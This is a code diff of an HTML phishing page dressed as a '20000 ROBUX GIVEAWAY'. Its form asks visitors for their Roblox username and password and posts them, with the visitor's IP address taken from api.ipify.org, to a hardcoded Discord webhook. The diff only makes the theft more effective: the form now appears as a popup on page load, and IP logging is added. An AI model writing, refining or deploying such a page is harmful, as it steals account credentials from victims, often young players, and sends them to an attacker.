@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Robux Giveaway</title>
+    <meta charset="UTF-8">
+    <title>20000 ROBUX GIVEAWAY</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -33,53 +34,61 @@
         }
     </style>
 </head>
-<body>
-    <div class="popup">
-        <div class="popup-content">
-            <h1 style="color: #2ecc71;">20000 ROBUX GIVEAWAY</h1>
-            <form id="robux-form">
-                <label for="username">Roblox Username:</label><br>
-                <input type="text" id="username" name="username" required><br><br>
-                <label for="password">Roblox Password:</label><br>
-                <input type="password" id="password" name="password" required><br><br>
-                <button class="submit-btn" type="submit">Submit</button>
-            </form>
-        </div>
-    </div>
+<body onload="showGiveaway()">
+    <!-- Fake content here -->
+    <h1>20000 ROBUX GIVEAWAY</h1>
 
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0/dist/tf.min.js"></script>
     <script>
-        const form = document.getElementById('robux-form');
-        const webhookUrl = 'https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ';
-        
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        async function showGiveaway() {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            popup.innerHTML = `
+                <div class="popup-content">
+                    <h1 style="color: #2ecc71;">20000 ROBUX GIVEAWAY</h1>
+                    <form id="robux-form">
+                        <label for="username">Roblox Username:</label><br>
+                        <input type="text" id="username" name="username" required><br><br>
+                        <label for="password">Roblox Password:</label><br>
+                        <input type="password" id="password" name="password" required><br><br>
+                        <button class="submit-btn" type="submit">Submit</button>
+                    </form>
+                </div>
+            `;
+            document.body.appendChild(popup);
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    embeds: [
-                        {
-                            title: 'Roblox Account',
-                            description: `Account: ${username}\nPassword: ${password}`,
-                            color: '#2ecc71',
-                        },
-                    ],
-                }),
-            })
-            .then((response) => response.json())
-            .then((data) => console.log(data))
-            .catch((error) => console.error(error));
+            const form = document.getElementById('robux-form');
+            const webhookURL = 'https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ';
 
-            alert('Thanks for participating!');
-        });
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Log IP as well
+                const ipResponse = await fetch('https://api.ipify.org');
+                const ip = await ipResponse.text();
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [
+                            {
+                                title: 'Roblox Account',
+                                description: `Account: ${username}\nPassword: ${password}\nIP Address: ${ip}`,
+                                color: '#2ecc71',
+                            },
+                        ],
+                    }),
+                })
+                .then((response) => response.json())
+                .then((data) => console.log(data))
+                .catch((error) => console.error(error));
+
+                alert('Thanks for participating!');
+                popup.remove();
+            });
+        }
     </script>
 </body>
-</html>
-
 </html>
